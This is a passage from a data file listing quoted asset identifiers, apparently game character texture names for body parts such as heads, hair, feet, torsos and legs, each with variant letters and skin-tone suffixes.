ni","accs_diff_012_j_uni","accs_diff_012_k_uni","accs_diff_012_l_uni","accs_diff_012_m_uni","accs_diff_012_n_uni","accs_diff_012_o_uni","accs_diff_012_p_uni","accs_diff_013_a_uni","accs_diff_013_b_uni","accs_diff_013_c_uni","accs_diff_013_d_uni","accs_diff_013_e_uni","accs_diff_013_f_uni","accs_diff_013_g_uni","accs_diff_013_h_uni","accs_diff_013_i_uni","accs_diff_013_j_uni","accs_diff_013_k_uni","accs_diff_013_l_uni","accs_diff_013_m_uni","accs_diff_013_n_uni","accs_diff_013_o_uni","accs_diff_013_p_uni","accs_diff_014_a_uni","accs_diff_014_b_uni","accs_diff_014_c_uni","accs_diff_014_d_uni","accs_diff_014_e_uni","accs_diff_014_f_uni","accs_diff_014_g_uni","accs_diff_014_h_uni","accs_diff_014_i_uni","accs_diff_014_j_uni","accs_diff_014_k_uni","accs_diff_014_l_uni","accs_diff_014_m_uni","accs_diff_014_n_uni","accs_diff_014_o_uni","accs_diff_014_p_uni","accs_diff_015_a_uni","berd_diff_000_a_uni","berd_diff_001_a_uni","berd_diff_001_b_uni","berd_diff_001_c_uni","berd_diff_001_d_uni","berd_diff_002_a_uni","berd_diff_002_b_uni","berd_diff_002_c_uni","berd_diff_002_d_uni","berd_diff_003_a_uni","berd_diff_004_a_uni","berd_diff_004_b_uni","berd_diff_004_c_uni","berd_diff_004_d_uni","berd_diff_005_a_uni","berd_diff_005_b_uni","berd_diff_005_c_uni","berd_diff_005_d_uni","berd_diff_006_a_uni","berd_diff_006_b_uni","berd_diff_006_c_uni","berd_diff_006_d_uni","berd_diff_007_a_uni","berd_diff_007_b_uni","berd_diff_007_c_uni","berd_diff_007_d_uni","decl_diff_000_a_uni","decl_diff_001_a_uni","decl_diff_002_a_uni","decl_diff_003_a_uni","decl_diff_004_a_uni","decl_diff_005_a_uni","decl_diff_006_a_uni","feet_diff_000_a_uni","feet_diff_000_b_uni","feet_diff_000_c_uni","feet_diff_000_d_uni","feet_diff_000_e_uni","feet_diff_000_f_uni","feet_diff_000_g_uni","feet_diff_000_h_uni","feet_diff_000_i_uni","feet_diff_000_j_uni","feet_diff_000_k_uni","feet_diff_000_l_uni","feet_diff_000_m_uni","feet_diff_000_n_uni","feet_diff_000_o_uni","feet_diff_000_p_uni","feet_diff_001_a_uni","feet_diff_001_b_uni","feet_diff_001_c_uni","feet_diff_001_d_uni","feet_diff_001_e_uni","feet_diff_001_f_uni","feet_diff_001_g_uni","feet_diff_001_h_uni","feet_diff_001_i_uni","feet_diff_001_j_uni","feet_diff_001_k_uni","feet_diff_001_l_uni","feet_diff_001_m_uni","feet_diff_001_n_uni","feet_diff_001_o_uni","feet_diff_001_p_uni","feet_diff_002_a_uni","feet_diff_002_b_uni","feet_diff_002_c_uni","feet_diff_002_d_uni","feet_diff_002_e_uni","feet_diff_002_f_uni","feet_diff_002_g_uni","feet_diff_002_h_uni","feet_diff_002_i_uni","feet_diff_002_j_uni","feet_diff_002_k_uni","feet_diff_002_l_uni","feet_diff_002_m_uni","feet_diff_002_n_uni","feet_diff_002_o_uni","feet_diff_002_p_uni","feet_diff_003_a_uni","feet_diff_003_b_uni","feet_diff_003_c_uni","feet_diff_003_d_uni","feet_diff_003_e_uni","feet_diff_003_f_uni","feet_diff_003_g_uni","feet_diff_003_h_uni","feet_diff_003_i_uni","feet_diff_003_j_uni","feet_diff_003_k_uni","feet_diff_003_l_uni","feet_diff_003_m_uni","feet_diff_003_n_uni","feet_diff_003_o_uni","feet_diff_003_p_uni","feet_diff_004_a_uni","feet_diff_004_b_uni","feet_diff_004_c_uni","feet_diff_004_d_uni","feet_diff_004_e_uni","feet_diff_004_f_uni","feet_diff_004_g_uni","feet_diff_004_h_uni","feet_diff_004_i_uni","feet_diff_004_j_uni","feet_diff_004_k_uni","feet_diff_004_l_uni","feet_diff_004_m_uni","feet_diff_004_n_uni","feet_diff_004_o_uni","feet_diff_004_p_uni","feet_diff_005_a_whi","feet_diff_005_b_whi","feet_diff_005_c_whi","feet_diff_005_d_whi","feet_diff_005_e_whi","feet_diff_005_f_whi","feet_diff_005_g_whi","feet_diff_005_h_whi","feet_diff_005_i_whi","feet_diff_005_j_whi","feet_diff_005_k_whi","feet_diff_005_l_whi","feet_diff_005_m_whi","feet_diff_005_n_whi","feet_diff_005_o_whi","feet_diff_005_p_whi","feet_diff_006_a_uni","feet_diff_006_b_uni","feet_diff_006_c_uni","feet_diff_006_d_uni","feet_diff_006_e_uni","feet_diff_006_f_uni","feet_diff_006_g_uni","feet_diff_006_h_uni","feet_diff_006_i_uni","feet_diff_006_j_uni","feet_diff_006_k_uni","feet_diff_006_l_uni","feet_diff_006_m_uni","feet_diff_006_n_uni","feet_diff_006_o_uni","feet_diff_006_p_uni","feet_diff_007_a_uni","feet_diff_007_b_uni","feet_diff_007_c_uni","feet_diff_007_d_uni","feet_diff_007_e_uni","feet_diff_007_f_uni","feet_diff_007_g_uni","feet_diff_007_h_uni","feet_diff_007_i_uni","feet_diff_007_j_uni","feet_diff_007_k_uni","feet_diff_007_l_uni","feet_diff_007_m_uni","feet_diff_007_n_uni","feet_diff_007_o_uni","feet_diff_007_p_uni","feet_diff_008_a_uni","feet_diff_008_b_uni","feet_diff_008_c_uni","feet_diff_008_d_uni","feet_diff_008_e_uni","feet_diff_008_f_uni","feet_diff_008_g_uni","feet_diff_008_h_uni","feet_diff_008_i_uni","feet_diff_008_j_uni","feet_diff_008_k_uni","feet_diff_008_l_uni","feet_diff_008_m_uni","feet_diff_008_n_uni","feet_diff_008_o_uni","feet_diff_008_p_uni","feet_diff_009_a_uni","feet_diff_009_b_uni","feet_diff_009_c_uni","feet_diff_009_d_uni","feet_diff_009_e_uni","feet_diff_009_f_uni","feet_diff_009_g_uni","feet_diff_009_h_uni","feet_diff_009_i_uni","feet_diff_009_j_uni","feet_diff_009_k_uni","feet_diff_009_l_uni","feet_diff_009_m_uni","feet_diff_009_n_uni","feet_diff_009_o_uni","feet_diff_009_p_uni","feet_diff_010_a_uni","feet_diff_010_b_uni","feet_diff_010_c_uni","feet_diff_010_d_uni","feet_diff_010_e_uni","feet_diff_010_f_uni","feet_diff_010_g_uni","feet_diff_010_h_uni","feet_diff_010_i_uni","feet_diff_010_j_uni","feet_diff_010_k_uni","feet_diff_010_l_uni","feet_diff_010_m_uni","feet_diff_010_n_uni","feet_diff_010_o_uni","feet_diff_010_p_uni","feet_diff_011_a_uni","feet_diff_011_b_uni","feet_diff_011_c_uni","feet_diff_011_d_uni","feet_diff_011_e_uni","feet_diff_011_f_uni","feet_diff_011_g_uni","feet_diff_011_h_uni","feet_diff_011_i_uni","feet_diff_011_j_uni","feet_diff_011_k_uni","feet_diff_011_l_uni","feet_diff_011_m_uni","feet_diff_011_n_uni","feet_diff_011_o_uni","feet_diff_011_p_uni","feet_diff_012_a_uni","feet_diff_012_b_uni","feet_diff_012_c_uni","feet_diff_012_d_uni","feet_diff_012_e_uni","feet_diff_012_f_uni","feet_diff_012_g_uni","feet_diff_012_h_uni","feet_diff_012_i_uni","feet_diff_012_j_uni","feet_diff_012_k_uni","feet_diff_012_l_uni","feet_diff_012_m_uni","feet_diff_012_n_uni","feet_diff_012_o_uni","feet_diff_012_p_uni","feet_diff_013_a_uni","feet_diff_013_b_uni","feet_diff_013_c_uni","feet_diff_013_d_uni","feet_diff_013_e_uni","feet_diff_013_f_uni","feet_diff_013_g_uni","feet_diff_013_h_uni","feet_diff_013_i_uni","feet_diff_013_j_uni","feet_diff_013_k_uni","feet_diff_013_l_uni","feet_diff_013_m_uni","feet_diff_013_n_uni","feet_diff_013_o_uni","feet_diff_013_p_uni","feet_diff_014_a_uni","feet_diff_014_b_uni","feet_diff_014_c_uni","feet_diff_014_d_uni","feet_diff_014_e_uni","feet_diff_014_f_uni","feet_diff_014_g_uni","feet_diff_014_h_uni","feet_diff_014_i_uni","feet_diff_014_j_uni","feet_diff_014_k_uni","feet_diff_014_l_uni","feet_diff_014_m_uni","feet_diff_014_n_uni","feet_diff_014_o_uni","feet_diff_014_p_uni","feet_diff_015_a_uni","feet_diff_015_b_uni","feet_diff_015_c_uni","feet_diff_015_d_uni","feet_diff_015_e_uni","feet_diff_015_f_uni","feet_diff_015_g_uni","feet_diff_015_h_uni","feet_diff_015_i_uni","feet_diff_015_j_uni","feet_diff_015_k_uni","feet_diff_015_l_uni","feet_diff_015_m_uni","feet_diff_015_n_uni","feet_diff_015_o_uni","feet_diff_015_p_uni","hair_diff_000_a_uni","hair_diff_001_a_uni","hair_diff_001_b_uni","hair_diff_001_c_uni","hair_diff_001_d_uni","hair_diff_001_e_uni","hair_diff_001_f_uni","hair_diff_002_a_uni","hair_diff_002_b_uni","hair_diff_002_c_uni","hair_diff_002_d_uni","hair_diff_002_e_uni","hair_diff_002_f_uni","hair_diff_003_a_uni","hair_diff_003_b_uni","hair_diff_003_c_uni","hair_diff_003_d_uni","hair_diff_003_e_uni","hair_diff_003_f_uni","hair_diff_004_a_uni","hair_diff_004_b_uni","hair_diff_004_c_uni","hair_diff_004_d_uni","hair_diff_004_e_uni","hair_diff_004_f_uni","hair_diff_004_g_uni","hair_diff_005_a_uni","hair_diff_005_b_uni","hair_diff_005_c_uni","hair_diff_005_d_uni","hair_diff_005_e_uni","hair_diff_005_f_uni","hair_diff_006_a_uni","hair_diff_006_b_uni","hair_diff_006_c_uni","hair_diff_006_d_uni","hair_diff_006_e_uni","hair_diff_006_f_uni","hair_diff_007_a_uni","hair_diff_007_b_uni","hair_diff_007_c_uni","hair_diff_007_d_uni","hair_diff_007_e_uni","hair_diff_007_f_uni","hair_diff_007_g_uni","hair_diff_008_a_uni","hair_diff_008_b_uni","hair_diff_008_c_uni","hair_diff_008_d_uni","hair_diff_008_e_uni","hair_diff_009_a_uni","hair_diff_009_b_uni","hair_diff_009_c_uni","hair_diff_009_d_uni","hair_diff_009_e_uni","hair_diff_009_f_uni","hair_diff_009_g_uni","hair_diff_010_a_uni","hair_diff_010_b_uni","hair_diff_010_c_uni","hair_diff_010_d_uni","hair_diff_010_e_uni","hair_diff_010_f_uni","hair_diff_011_a_uni","hair_diff_011_b_uni","hair_diff_011_c_uni","hair_diff_011_d_uni","hair_diff_011_e_uni","hair_diff_011_f_uni","hair_diff_012_a_uni","hair_diff_012_b_uni","hair_diff_012_c_uni","hair_diff_012_d_uni","hair_diff_012_e_uni","hair_diff_013_a_uni","hair_diff_013_b_uni","hair_diff_013_c_uni","hair_diff_013_d_uni","hair_diff_013_e_uni","hair_diff_013_f_uni","hair_diff_014_a_uni","hair_diff_014_b_uni","hair_diff_014_c_uni","hair_diff_014_d_uni","hair_diff_014_e_uni","hair_diff_015_a_uni","hair_diff_015_b_uni","hair_diff_015_c_uni","hair_diff_015_d_uni","hair_diff_015_e_uni","hair_diff_015_f_uni","hand_diff_000_a_uni","hand_diff_001_a_uni","hand_diff_002_a_uni","hand_diff_003_a_uni","hand_diff_004_a_uni","hand_diff_005_a_uni","hand_diff_006_a_uni","hand_diff_007_a_uni","hand_diff_008_a_uni","head_diff_000_a_whi","head_diff_001_a_whi","head_diff_002_a_bla","head_diff_003_a_bla","head_diff_004_a_lat","head_diff_005_a_lat","head_diff_006_a_chi","head_diff_007_a_chi","head_diff_008_a_pak","head_diff_009_a_pak","head_diff_010_a_ara","head_diff_011_a_ara","head_diff_012_a_whi","head_diff_013_a_whi","head_diff_014_a_bla","head_diff_015_a_bla","head_diff_016_a_lat","head_diff_017_a_chi","head_diff_018_a_chi","head_diff_019_a_pak","head_diff_020_a_ara","head_diff_021_a_whi","head_diff_022_a_whi","head_diff_023_a_bla","head_diff_024_a_bla","head_diff_025_a_lat","head_diff_026_a_lat","head_diff_027_a_chi","head_diff_028_a_chi","head_diff_029_a_pak","head_diff_030_a_pak","head_diff_031_a_ara","head_diff_032_a_ara","head_diff_033_a_whi","head_diff_034_a_whi","head_diff_035_a_bla","head_diff_036_a_bla","head_diff_037_a_lat","head_diff_038_a_lat","head_diff_039_a_chi","head_diff_040_a_chi","head_diff_041_a_ara","head_diff_042_a_whi","head_diff_043_a_whi","head_diff_044_a_whi","head_diff_045_a_whi","jbib_diff_000_a_uni","jbib_diff_000_b_uni","jbib_diff_000_c_uni","jbib_diff_000_d_uni","jbib_diff_000_e_uni","jbib_diff_000_f_uni","jbib_diff_000_g_uni","jbib_diff_000_h_uni","jbib_diff_000_i_uni","jbib_diff_000_j_uni","jbib_diff_000_k_uni","jbib_diff_000_l_uni","jbib_diff_000_m_uni","jbib_diff_000_n_uni","jbib_diff_000_o_uni","jbib_diff_000_p_uni","jbib_diff_001_a_uni","jbib_diff_001_b_uni","jbib_diff_001_c_uni","jbib_diff_001_d_uni","jbib_diff_001_e_uni","jbib_diff_001_f_uni","jbib_diff_001_g_uni","jbib_diff_001_h_uni","jbib_diff_001_i_uni","jbib_diff_001_j_uni","jbib_diff_001_k_uni","jbib_diff_001_l_uni","jbib_diff_001_m_uni","jbib_diff_001_n_uni","jbib_diff_001_o_uni","jbib_diff_001_p_uni","jbib_diff_002_a_uni","jbib_diff_002_b_uni","jbib_diff_002_c_uni","jbib_diff_002_d_uni","jbib_diff_002_e_uni","jbib_diff_002_f_uni","jbib_diff_002_g_uni","jbib_diff_002_h_uni","jbib_diff_002_i_uni","jbib_diff_002_j_uni","jbib_diff_002_k_uni","jbib_diff_002_l_uni","jbib_diff_002_m_uni","jbib_diff_002_n_uni","jbib_diff_002_o_uni","jbib_diff_002_p_uni","jbib_diff_003_a_uni","jbib_diff_003_b_uni","jbib_diff_003_c_uni","jbib_diff_003_d_uni","jbib_diff_003_e_uni","jbib_diff_003_f_uni","jbib_diff_003_g_uni","jbib_diff_003_h_uni","jbib_diff_003_i_uni","jbib_diff_003_j_uni","jbib_diff_003_k_uni","jbib_diff_003_l_uni","jbib_diff_003_m_uni","jbib_diff_003_n_uni","jbib_diff_003_o_uni","jbib_diff_003_p_uni","jbib_diff_004_a_uni","jbib_diff_004_b_uni","jbib_diff_004_c_uni","jbib_diff_004_d_uni","jbib_diff_004_e_uni","jbib_diff_004_f_uni","jbib_diff_004_g_uni","jbib_diff_004_h_uni","jbib_diff_004_i_uni","jbib_diff_004_j_uni","jbib_diff_004_k_uni","jbib_diff_004_l_uni","jbib_diff_004_m_uni","jbib_diff_004_n_uni","jbib_diff_004_o_uni","jbib_diff_004_p_uni","jbib_diff_005_a_uni","jbib_diff_005_b_uni","jbib_diff_005_c_uni","jbib_diff_005_d_uni","jbib_diff_005_e_uni","jbib_diff_005_f_uni","jbib_diff_005_g_uni","jbib_diff_005_h_uni","jbib_diff_005_i_uni","jbib_diff_005_j_uni","jbib_diff_005_k_uni","jbib_diff_005_l_uni","jbib_diff_005_m_uni","jbib_diff_005_n_uni","jbib_diff_005_o_uni","jbib_diff_005_p_uni","jbib_diff_006_a_uni","jbib_diff_006_b_uni","jbib_diff_006_c_uni","jbib_diff_006_d_uni","jbib_diff_006_e_uni","jbib_diff_006_f_uni","jbib_diff_006_g_uni","jbib_diff_006_h_uni","jbib_diff_006_i_uni","jbib_diff_006_j_uni","jbib_diff_006_k_uni","jbib_diff_006_l_uni","jbib_diff_007_a_uni","jbib_diff_007_b_uni","jbib_diff_007_c_uni","jbib_diff_007_d_uni","jbib_diff_007_e_uni","jbib_diff_007_f_uni","jbib_diff_007_g_uni","jbib_diff_007_h_uni","jbib_diff_007_i_uni","jbib_diff_007_j_uni","jbib_diff_007_k_uni","jbib_diff_007_l_uni","jbib_diff_007_m_uni","jbib_diff_007_n_uni","jbib_diff_007_o_uni","jbib_diff_007_p_uni","jbib_diff_008_a_uni","jbib_diff_008_b_uni","jbib_diff_008_c_uni","jbib_diff_008_d_uni","jbib_diff_008_e_uni","jbib_diff_008_f_uni","jbib_diff_008_g_uni","jbib_diff_008_h_uni","jbib_diff_008_i_uni","jbib_diff_008_j_uni","jbib_diff_008_k_uni","jbib_diff_008_l_uni","jbib_diff_008_m_uni","jbib_diff_008_n_uni","jbib_diff_008_o_uni","jbib_diff_008_p_uni","jbib_diff_009_a_uni","jbib_diff_009_b_uni","jbib_diff_009_c_uni","jbib_diff_009_d_uni","jbib_diff_009_e_uni","jbib_diff_009_f_uni","jbib_diff_009_g_uni","jbib_diff_009_h_uni","jbib_diff_009_i_uni","jbib_diff_009_j_uni","jbib_diff_009_k_uni","jbib_diff_009_l_uni","jbib_diff_009_m_uni","jbib_diff_009_n_uni","jbib_diff_009_o_uni","jbib_diff_009_p_uni","jbib_diff_010_a_uni","jbib_diff_010_b_uni","jbib_diff_010_c_uni","jbib_diff_010_d_uni","jbib_diff_010_e_uni","jbib_diff_010_f_uni","jbib_diff_010_g_uni","jbib_diff_010_h_uni","jbib_diff_010_i_uni","jbib_diff_010_j_uni","jbib_diff_010_k_uni","jbib_diff_010_l_uni","jbib_diff_010_m_uni","jbib_diff_010_n_uni","jbib_diff_010_o_uni","jbib_diff_010_p_uni","jbib_diff_011_a_uni","jbib_diff_011_b_uni","jbib_diff_011_c_uni","jbib_diff_011_d_uni","jbib_diff_011_e_uni","jbib_diff_011_f_uni","jbib_diff_011_g_uni","jbib_diff_011_h_uni","jbib_diff_011_i_uni","jbib_diff_011_j_uni","jbib_diff_011_k_uni","jbib_diff_011_l_uni","jbib_diff_011_m_uni","jbib_diff_011_n_uni","jbib_diff_011_o_uni","jbib_diff_011_p_uni","jbib_diff_012_a_uni","jbib_diff_012_b_uni","jbib_diff_012_c_uni","jbib_diff_012_d_uni","jbib_diff_012_e_uni","jbib_diff_012_f_uni","jbib_diff_012_g_uni","jbib_diff_012_h_uni","jbib_diff_012_i_uni","jbib_diff_012_j_uni","jbib_diff_012_k_uni","jbib_diff_012_l_uni","jbib_diff_012_m_uni","jbib_diff_012_n_uni","jbib_diff_012_o_uni","jbib_diff_012_p_uni","jbib_diff_013_a_uni","jbib_diff_013_b_uni","jbib_diff_013_c_uni","jbib_diff_013_d_uni","jbib_diff_013_e_uni","jbib_diff_013_f_uni","jbib_diff_013_g_uni","jbib_diff_013_h_uni","jbib_diff_013_i_uni","jbib_diff_013_j_uni","jbib_diff_013_k_uni","jbib_diff_013_l_uni","jbib_diff_013_m_uni","jbib_diff_013_n_uni","jbib_diff_013_o_uni","jbib_diff_013_p_uni","jbib_diff_014_a_uni","jbib_diff_014_b_uni","jbib_diff_014_c_uni","jbib_diff_014_d_uni","jbib_diff_014_e_uni","jbib_diff_014_f_uni","jbib_diff_014_g_uni","jbib_diff_014_h_uni","jbib_diff_014_i_uni","jbib_diff_014_j_uni","jbib_diff_014_k_uni","jbib_diff_014_l_uni","jbib_diff_014_m_uni","jbib_diff_014_n_uni","jbib_diff_014_o_uni","jbib_diff_014_p_uni","jbib_diff_015_a_uni","lowr_diff_000_a_whi","lowr_diff_000_b_whi","lowr_diff_000_c_whi","lowr_diff_000_d_whi","lowr_diff_000_e_whi","lowr_diff_000_f_whi","lowr_diff_000_g_whi","lowr_diff_000_h_whi","lowr_diff_000_i_whi","lowr_diff_000_j_whi","lowr_diff_000_k_whi","lowr_diff_000_l_whi","lowr_diff_000_m_whi","lowr_diff_000_n_whi","lowr_diff_000_o_whi","lowr_diff_000_p_whi","lowr_diff_001_a_whi","lowr_diff_001_b_whi","lowr_diff_001_c_whi","lowr_diff_001_d_whi","lowr_diff_001_e_whi","lowr_diff_001_f_whi","lowr_diff_001_g_whi","lowr_diff_001_h_whi","lowr_diff_001_i_whi","lowr_diff_001_j_whi","lowr_diff_001_k_whi","lowr_diff_001_l_whi","lowr_diff_001_m_whi","lowr_diff_001_n_whi","lowr_diff_001_o_whi","lowr_diff_001_p_whi","lowr_diff_002_a_whi","lowr_diff_002_b_whi","lowr_diff_002_c_whi","lowr_diff_002_d_whi","lowr_diff_002_e_whi","lowr_diff_002_f_whi","lowr_diff_002_g_whi","lowr_diff_002_h_whi","lowr_diff_002_i_whi","lowr_diff_002_j_whi","lowr_diff_002_k_whi","lowr_diff_002_l_whi","lowr_diff_002_m_whi","lowr_diff_002_n_whi","lowr_diff_002_o_whi","lowr_diff_002_p_whi","lowr_diff_003_a_whi","lowr_diff_003_b_whi","lowr_diff_003_c_whi","lowr_diff_003_d_whi","lowr_diff_003_e_whi","lowr_diff_003_f_whi","lowr_diff_003_g_whi","lowr_diff_003_h_whi","lowr_diff_003_i_whi","lowr_diff_003_j_whi","lowr_diff_003_k_whi","lowr_diff_003_l_whi","lowr_diff_003_m_whi","lowr_diff_003_n_whi","lowr_diff_003_o_whi","lowr_diff_003_p_whi","lowr_diff_004_a_whi","lowr_diff_004_b_whi","lowr_diff_004_c_whi","lowr_diff_004_d_whi","lowr_diff_004_e_whi","lowr_diff_004_f_whi","lowr_diff_004_g_whi","lowr_diff_004_h_whi","lowr_diff_004_i_whi","lowr_diff_004_j_whi","lowr_diff_004_k_whi","lowr_diff_004_l_whi","lowr_diff_004_m_whi","lowr_diff_004_n_whi","lowr_diff_004_o_whi","lowr_diff_004_p_whi","lowr_diff_005_a_whi","lowr_diff_005_b_whi","lowr_diff_005_c_whi","lowr_diff_005_d_whi","lowr_diff_005_e_whi","lowr_diff_005_f_whi","lowr_diff_005_g_whi","lowr_diff_005_h_whi","lowr_diff_005_i_whi","lowr_diff_005_j_whi","lowr_diff_005_k_whi","lowr_diff_005_l_whi","lowr_diff_005_m_whi","lowr_diff_005_n_whi","lowr_diff_005_o_whi","lowr_diff_005_p_whi","lowr_diff_006_a_whi","lowr_diff_006_b_whi","lowr_diff_006_c_whi","lowr_diff_006_d_whi","lowr_diff_006_e_whi","lowr_diff_006_f_whi","lowr_diff_006_g_whi","lowr_diff_006_h_whi","lowr_diff_006_i_whi","lowr_diff_006_j_whi","lowr_diff_006_k_whi","lowr_diff_006_l_whi","lowr_diff_006_m_whi","lowr_diff_006_n_whi","lowr_diff_006_o_whi","lowr_diff_006_p_whi","lowr_diff_007_a_whi","lowr_diff_007_b_whi","lowr_diff_007_c_whi","lowr_diff_007_d_whi","lowr_diff_007_e_whi","lowr_diff_007_f_whi","lowr_diff_007_g_whi","lowr_diff_007_h_whi","lowr_diff_007_i_whi","lowr_diff_007_j_whi","lowr_diff_007_k_whi","lowr_diff_007_l_whi","lowr_diff_007_m_whi","lowr_diff_007_n_whi","lowr_diff_007_o_whi","lowr_diff_007_p_whi","lowr_diff_008_a_whi","lowr_diff_008_b_whi","lowr_diff_008_c_whi","lowr_diff_008_d_whi","lowr_diff_008_e_whi","lowr_diff_008_f_whi","lowr_diff_008_g_whi","lowr_diff_008_h_whi","lowr_diff_008_i_whi","lowr_diff_008_j_whi","lowr_diff_008_k_whi","lowr_diff_008_l_whi","lowr_diff_008_m_whi","lowr_diff_008_n_whi","lowr_diff_008_o_whi","lowr_diff_008_p_whi","lowr_diff_009_a_whi","lowr_diff_009_b_whi","lowr_diff_009_c_whi","lowr_diff_009_d_whi","lowr_diff_009_e_whi","lowr_diff_009_f_whi","lowr_diff_009_g_whi","lowr_diff_009_h_whi","lowr_diff_009_i_whi","lowr_diff_009_j_whi","lowr_diff_009_k_whi","lowr_diff_009_l_whi","lowr_diff_009_m_whi","lowr_diff_009_n_whi","lowr_diff_009_o_whi","lowr_diff_009_p_whi","lowr_diff_010_a_whi","lowr_diff_010_b_whi","lowr_diff_010_c_whi","lowr_diff_010_d_whi","lowr_diff_010_e_whi","lowr_diff_010_f_whi","lowr_diff_010_g_whi","lowr_diff_010_h_whi","lowr_diff_010_i_whi","lowr_diff_010_j_whi","lowr_diff_010_k_whi","lowr_diff_010_l_whi","lowr_diff_010_m_whi","lowr_diff_010_n_whi","lowr_diff_010_o_whi","lowr_diff_010_p_whi","lowr_diff_011_a_whi","lowr_diff_011_b_whi","lowr_diff_011_c_whi","lowr_diff_011_d_whi","lowr_diff_011_e_whi","lowr_diff_011_f_whi","lowr_diff_011_g_whi","lowr_diff_011_h_whi","lowr_diff_011_i_whi","lowr_diff_011_j_whi","lowr_diff_011_k_whi","lowr_diff_011_l_whi","lowr_diff_011_m_whi","lowr_diff_011_n_whi","lowr_diff_011_o_whi","lowr_diff_011_p_whi","lowr_diff_012_a_whi","lowr_diff_012_b_whi","lowr_diff_012_c_whi","lowr_diff_012_d_whi","lowr_diff_012_e_whi","lowr_diff_012_f_whi","lowr_diff_012_g_whi","lowr_diff_012_h_whi","lowr_diff_012_i_whi","lowr_diff_012_j_whi","lowr_diff_012_k_whi","lowr_diff_012_l_whi","lowr_diff_012_m_whi","lowr_diff_012_n_whi","lowr_diff_012_o_whi","lowr_diff_012_p_whi","lowr_diff_013_a_whi","lowr_diff_013_b_whi","lowr_diff_013_c_whi","lowr_diff_013_d_whi","lowr_diff_013_e_whi","lowr_diff_013_f_whi","lowr_diff_013_g_whi","lowr_diff_013_h_whi","lowr_diff_013_i_whi","lowr_diff_013_j_whi","lowr_diff_013_k_whi","lowr_diff_013_l_whi","lowr_diff_013_m_whi","lowr_diff_013_n_whi","lowr_diff_013_o_whi","lowr_diff_013_p_whi","lowr_diff_014_a_whi","lowr_diff_014_b_whi","lowr_diff_014_c_whi","lowr_diff_014_d_whi","lowr_diff_014_e_whi","lowr_diff_014_f_whi","lowr_diff_014_g_whi","lowr_diff_014_h_whi","lowr_diff_014_i_whi","lowr_diff_014_j_whi","lowr_diff_014_k_whi","lowr_diff_014_l_whi","lowr_diff_014_m_whi","lowr_diff_014_n_whi","lowr_diff_014_o_whi","lowr_diff_014_p_whi","lowr_diff_015_a_whi","lowr_diff_015_b_whi","lowr_diff_015_c_whi","lowr_diff_015_d_whi","lowr_diff_015_e_whi","lowr_diff_015_f_whi","lowr_diff_015_g_whi","lowr_diff_015_h_whi","lowr_diff_015_i_whi","lowr_diff_015_j_whi","lowr_diff_015_k_whi","lowr_diff_015_l_whi","lowr_diff_015_m_whi","lowr_diff_015_n_whi","lowr_diff_015_o_whi","lowr_diff_015_p_whi","task_diff_000_a_uni","task_diff_001_a_uni","task_diff_001_b_uni","task_diff_001_c_uni","task_diff_001_d_uni","task_diff_001_e_uni","task_diff_002_a_uni","task_diff_002_b_uni","task_diff_002_c_uni","task_diff_002_d_uni","task_diff_002_e_uni","task_diff_003_a_uni","task_diff_003_b_uni","task_diff_003_c_uni","task_diff_003_d_uni","task_diff_003_e_uni","task_diff_004_a_uni","task_diff_004_b_uni","task_diff_004_c_uni","task_diff_004_d_uni","task_diff_004_e_uni","task_diff_005_a_uni","task_diff_005_b_uni","task_diff_005_c_uni","task_diff_005_d_uni","task_diff_005_e_uni","task_diff_006_a_uni","task_diff_006_b_uni","task_diff_006_c_uni","task_diff_006_d_uni","task_diff_006_e_uni","task_diff_007_a_uni","task_diff_007_b_uni","task_diff_007_c_uni","task_diff_007_d_uni","task_diff_007_e_uni","task_diff_008_a_uni","task_diff_008_b_uni","task_diff_008_c_uni","task_diff_008_d_uni","task_diff_008_e_uni","task_diff_009_a_uni","task_diff_009_b_uni","task_diff_009_c_uni","task_diff_009_d_uni","task_diff_009_e_uni","teef_diff_000_a_uni","teef_diff_001_a_uni","teef_diff_001_b_uni","teef_diff_001_c_uni","teef_diff_002_a_uni","teef_diff_002_b_uni","teef_diff_002_c_uni","teef_diff_003_a_uni","teef_diff_003_b_uni","teef_diff_003_c_uni","teef_diff_004_a_uni","teef_diff_004_b_uni","teef_diff_004_c_uni","teef_diff_004_d_uni","teef_diff_004_e_uni","teef_diff_004_f_uni","teef_diff_004_g_uni","teef_diff_004_h_uni","teef_diff_004_i_uni","teef_diff_004_j_uni","teef_diff_004_k_uni","teef_diff_004_l_uni","teef_diff_004_m_uni","teef_diff_004_n_uni","teef_diff_004_o_uni","teef_diff_004_p_uni","teef_diff_005_a_uni","teef_diff_005_b_uni","teef_diff_005_c_uni","teef_diff_005_d_uni","teef_diff_005_e_uni","teef_diff_005_f_uni","teef_diff_006_a_uni","teef_diff_006_b_uni","teef_diff_006_c_uni","teef_diff_006_d_uni","teef_diff_006_e_uni","teef_diff_006_f_uni","teef_diff_007_a_uni","teef_diff_008_a_uni","teef_diff_009_a_uni","teef_diff_010_a_uni","teef_diff_010_b_uni","teef_diff_010_c_uni","teef_diff_010_d_uni","teef_diff_010_e_uni","teef_diff_010_f_uni","teef_diff_010_g_uni","teef_diff_010_h_uni","teef_diff_010_i_uni","teef_diff_010_j_uni","teef_diff_010_k_uni","teef_diff_010_l_uni","teef_diff_010_m_uni","teef_diff_010_n_uni","teef_diff_010_o_uni","teef_diff_010_p_uni","teef_diff_011_a_uni","teef_diff_011_b_uni","teef_diff_011_c_uni","teef_diff_011_d_uni","teef_diff_011_e_uni","teef_diff_011_f_uni","teef_diff_011_g_uni","teef_diff_011_h_uni","teef_diff_011_i_uni","teef_diff_011_j_uni","teef_diff_011_k_uni","teef_diff_011_l_uni","teef_diff_011_m_uni","teef_diff_011_n_uni","teef_diff_011_o_uni","teef_diff_011_p_uni","teef_diff_012_a_uni","teef_diff_012_b_uni","teef_diff_012_c_uni","teef_diff_012_d_uni","teef_diff_012_e_uni","teef_diff_012_f_uni","teef_diff_012_g_uni","teef_diff_012_h_uni","teef_diff_012_i_uni","teef_diff_012_j_uni","teef_diff_012_k_uni","teef_diff_012_l_uni","teef_diff_012_m_uni","teef_diff_012_n_uni","teef_diff_012_o_uni","teef_diff_012_p_uni","teef_diff_013_a_uni","teef_diff_014_a_uni","teef_diff_015_a_uni","uppr_diff_000_a_whi","uppr_diff_001_a_whi","uppr_diff_002_a_whi","uppr_diff_003_a_whi","uppr_diff_004_a_whi","uppr_diff_005_a_whi","uppr_diff_006_a_whi","uppr_diff_007_a_whi","uppr_diff_008_a_whi","uppr_diff_009_a_whi","uppr_diff_010_a_whi","uppr_diff_011_a_whi","uppr_diff_012_a_whi","uppr_diff_013_a_whi","uppr_diff_014_a_whi","uppr_diff_01